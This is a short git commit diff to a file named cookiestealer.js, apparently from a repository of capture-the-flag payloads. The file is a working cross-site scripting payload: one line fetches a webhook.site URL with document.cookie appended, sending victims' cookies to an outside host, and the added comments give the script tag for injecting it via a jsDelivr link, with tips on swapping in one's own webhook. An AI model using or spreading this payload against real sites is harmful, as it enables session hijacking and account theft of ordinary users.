9df02548856be1a94248b8e9b8965b67ad1f7f0d
Moamen Yasser <168992349+ymuuuu@users.noreply.github.com>
2024-12-03 20:37:38 +0200

    Update cookiestealer.js

--- cookiestealer.js
+++ cookiestealer.js
@@ -1,1 +1,4 @@
 fetch('https://webhook.site/3ad03e0b-3af3-47a4-a0c4-3a385f0374c3?c=' + document.cookie)
+// use this injection payload to call the js code above
+// make sure to update the commit hash and the webhook server
+// <script src="https://cdn.jsdelivr.net/gh/ymuuuu/some-ctf-payloads@c3806fa40cffdbd394e1eed796777608dfb05ee2/cookiestealer.js"></script> 
